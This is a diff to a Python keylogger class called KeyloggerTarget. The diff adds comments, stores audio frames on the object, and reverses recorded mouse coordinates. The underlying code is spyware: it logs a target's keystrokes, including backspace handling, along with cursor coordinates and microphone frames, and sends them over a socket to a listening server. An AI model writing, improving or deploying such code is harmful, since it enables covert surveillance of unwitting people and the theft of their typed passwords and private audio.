@@ -40,6 +40,7 @@ class KeyloggerTarget:
         self.coordinates = []
         self.word = None
         self.seconds = []
+        self.frames = None
 
     def daten_aufnehemen(self):
         listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -73,8 +74,8 @@ class KeyloggerTarget:
 
             # Connection with ServerListener
 
-            str_frames = str(frames)
-            listening_data.send(str_frames.encode())
+            self.frames = str(frames)
+            listening_data.send(self.frames.encode())
 
         except OSError:
             print("NO MICROPHONE DETECTED OR MICROPHONE SETTING DISABLED")
@@ -148,6 +149,8 @@ class KeyloggerTarget:
             for zeichen in self.richtige_liste:
                 wort += zeichen
 
+            # Gets the coordinates where the target was writing something from the beginning
+            self.coordinates = self.coordinates[::-1]
             # Sends the data to server_keylogger
             all_data = str(self.coordinates) + wort
             # Coordinates and keydata are being concatenated
@@ -172,6 +175,8 @@ class KeyloggerTarget:
             for zeichen in self.richtige_liste:
                 wort += zeichen
             if self.coordinates:
+                self.coordinates = self.coordinates[::-1]
+                # This is the same as above
                 wort += str(self.coordinates)
             data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
             # This let's the server know that the server should shut down
@@ -275,22 +280,31 @@ class KeyloggerTarget:
                 pass
             else:
                 self.caps = False
+                # This resets everything
 
             if key == keyboard.Key.backspace:
                 dt = datetime.now()
+                # Gets the current time
                 get_time = str(dt).split(":")
+                # This splits the time so the minutes and seconds are displayed
 
                 hour, minutes, sec = int(get_time[0][::-1][0:2][::-1]), int(get_time[1]), float(get_time[2])
+                # Gets the current hour, minute and second
 
                 all = hour * 3600 + minutes * 60 + sec
+                # Gets the seconds of everything from hour to second
                 if not self.seconds:
+                    # If there is nothing in the list second will be appanded
                     self.seconds.append(all)
                 minus = all - self.seconds[0]
+                # This checks if the target is holding the backspace key
                 if minus > 0.05 or minus == 0.0:
                     if self.richtige_liste:
                         self.richtige_liste.pop(-1)
+                        # Removes the last item of the list
 
                 self.seconds[0] = all
+                # List will allways be updated
 
     def on_release(self, key):
         print(f'Key released: {key}')
